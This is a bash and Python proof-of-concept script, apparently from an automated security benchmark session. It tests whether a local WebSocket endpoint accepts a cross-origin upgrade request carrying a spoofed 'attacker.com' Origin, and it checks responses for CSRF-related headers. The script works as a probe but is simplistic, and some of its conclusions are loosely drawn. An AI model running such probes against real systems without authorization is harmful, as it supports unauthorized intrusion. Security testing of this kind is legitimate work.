#!/bin/bash
# POC: Simplified POC demonstrating CSRF vulnerability on WebSocket endpoint by attempting connection with cross-origin header
# Target: ./repo
# Created: 2025-11-10T14:44:15.746Z
# Session: benchmark-XBEN-025-24-mht8yjgo

# CSRF via WebSocket - No Token Validation POC (Simplified)
# Demonstrates that WebSocket endpoint accepts connections without CSRF token validation

TARGET_HOST="localhost"
TARGET_PORT="22222"

echo "[*] CSRF via WebSocket POC - Testing WebSocket CSRF protection"
echo "[*] Target: ws://${TARGET_HOST}:${TARGET_PORT}/ws"
echo ""

# Test 1: Check if WebSocket accepts connection with cross-origin header
echo "[*] Attempting WebSocket connection with cross-origin (attacker.com)..."

# Use Python for more reliable WebSocket testing
python3 << 'PYEOF'
import socket
import base64
import sys

host = "localhost"
port = 22222

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((host, port))
    
    # Send WebSocket upgrade request with cross-origin header
    key = "dGhlIHNhbXBsZSBub25jZQ=="
    request = (
        f"GET /ws HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: http://attacker.com\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"\r\n"
    )
    
    sock.sendall(request.encode())
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    
    # Check for successful WebSocket upgrade (101 response)
    if "101" in response:
        print("[+] SUCCESS: WebSocket accepted upgrade WITHOUT validating CSRF token")
        print("[+] Response status indicates 101 Switching Protocols")
        print("[+] VULNERABILITY: Origin header (attacker.com) was NOT validated")
        sock.close()
        sys.exit(0)
    elif "Upgrade: websocket" in response or "upgrade" in response.lower():
        print("[+] SUCCESS: WebSocket endpoint accepted connection from cross-origin")
        print("[+] VULNERABILITY: No CSRF protection detected")
        sock.close()
        sys.exit(0)
    else:
        print("[!] Response received but unclear:")
        print(response[:300])
        sock.close()
        sys.exit(1)
        
except socket.timeout:
    print("[-] Connection timeout")
    sys.exit(1)
except ConnectionRefusedError:
    print("[-] Connection refused - WebSocket endpoint not available")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
PYEOF

PYTHON_EXIT=$?

# Test 2: Check HTTP response for CSRF protection headers
echo ""
echo "[*] Checking HTTP response headers for CSRF protections..."

RESPONSE=$(curl -s -i "http://${TARGET_HOST}:${TARGET_PORT}/ws" 2>&1)

echo "[*] Checking for CSRF protection mechanisms..."

# Look for CSRF-related protections
HAS_CSRF_TOKEN=$(echo "$RESPONSE" | grep -i "X-CSRF" || echo "")
HAS_SAMESITE=$(echo "$RESPONSE" | grep -i "SameSite" || echo "")
HAS_CSP=$(echo "$RESPONSE" | grep -i "Content-Security-Policy" || echo "")

if [ -z "$HAS_CSRF_TOKEN" ]; then
  echo "[+] No X-CSRF-Token header - CSRF not protected via headers"
else
  echo "[-] Found CSRF token header"
fi

if [ -z "$HAS_SAMESITE" ]; then
  echo "[+] No SameSite cookie attribute - CSRF not protected via SameSite"
else
  echo "[-] Found SameSite cookie protection"
fi

if [ -z "$HAS_CSP" ]; then
  echo "[+] No Content-Security-Policy - CSRF risk elevated"
else
  echo "[-] Found CSP header"
fi

echo ""
echo "[*] CSRF WebSocket Vulnerability Assessment:"
if [ $PYTHON_EXIT -eq 0 ]; then
  echo "[+] WebSocket endpoint accepts connections without CSRF token validation"
  echo "[+] No Origin header validation detected"
  echo "[+] CSRF attack is possible on WebSocket connections"
  exit 0
else
  echo "[!] Could not fully confirm CSRF vulnerability"
  exit 1
fi